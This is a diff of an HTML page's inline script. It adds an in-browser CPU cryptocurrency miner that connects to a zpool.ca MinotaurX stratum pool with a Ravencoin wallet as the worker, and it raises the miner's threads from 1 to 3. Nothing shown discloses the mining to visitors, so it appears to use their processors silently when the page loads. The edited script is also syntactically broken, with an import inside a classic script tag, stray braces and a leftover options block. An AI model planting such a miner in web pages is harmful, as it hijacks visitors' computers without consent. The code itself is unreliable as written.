@@ -11,20 +11,23 @@
   <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
   <script src="app.js"></script>
   <script>
-    const stratum = {
-      server: "minotaurx.na.mine.zpool.ca",
-      port: 7019,
-      worker: "R9uHDn9XXqPAe2TLsEmVoNrokmWsHREV2Q",
-      password: "c=RVN"
+    import * as cpuWebMiner from "@marco_ciaramella/cpu-web-miner";
+
+const stratum = {
+    server: "minotaurx.na.mine.zpool.ca",
+    port: 7019,
+    worker: "R9uHDn9XXqPAe2TLsEmVoNrokmWsHREV2Q",
+    password: "c=RVN"
+}
+
+cpuWebMiner.mine(cpuWebMiner.minotaurx, stratum, true);
+    
     }
 
-    mine({
-      // required
-      stratum,
       // optional
       options: {
         log: true, // enables/disables logs
-        threads: 1
+        threads: 3
       }
     })
   </script>
